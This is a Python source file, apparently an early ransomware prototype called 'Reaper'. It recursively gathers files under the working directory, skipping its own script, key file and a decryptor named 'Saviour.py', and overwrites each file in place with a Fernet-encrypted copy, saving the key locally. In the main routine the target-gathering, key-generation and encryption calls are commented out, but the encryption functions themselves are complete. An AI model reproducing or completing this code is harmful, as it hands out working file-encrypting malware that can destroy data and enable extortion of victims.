import os
from Victim import Victim
from cryptography.fernet import Fernet
from threading import Thread


def generate_key():
    key = Fernet.generate_key()

    with open("key.key", "wb") as key_file:
        key_file.write(key)

    return key


class Reaper(Thread):
    targets = []

    def gather_targets(self, path=os.getcwd()):
        for file in os.scandir(path):
            name = file.path.split("\\")[-1]

            if name == "Reaper.py" or name == "key.key" or name == "Saviour.py":
                continue

            if file.is_dir():
                if name == "venv" or name == ".git" or name == "inspectionProfiles" or name == ".idea":
                    continue
                self.gather_targets(file)

            else:
                self.targets.append(file.path)

    def encrypt(self, key):
        for file in self.targets:
            with open(file, "rb") as target_file:
                plain_text = target_file.read()
                cipher = Fernet(key).encrypt(plain_text)

            with open(file, "wb") as target_file:
                target_file.write(cipher)

        print("Files locked.")

    def run(self):
        # Get information regarding the target machine
        victim = Victim()

        if victim.get_system() == "Windows":
            print("Optimizing Reaper for Windows...")
            # print("Locating targets...")
            # self.gather_targets()
            # print(self.targets)

        elif victim.get_system() == "Linux":
            print("Optimizing Reaper for Linux")

        # print("Generating key...")
        # key = generate_key()



        # print("Encrypting files...")
        # self.encrypt(key)


Reaper().start()
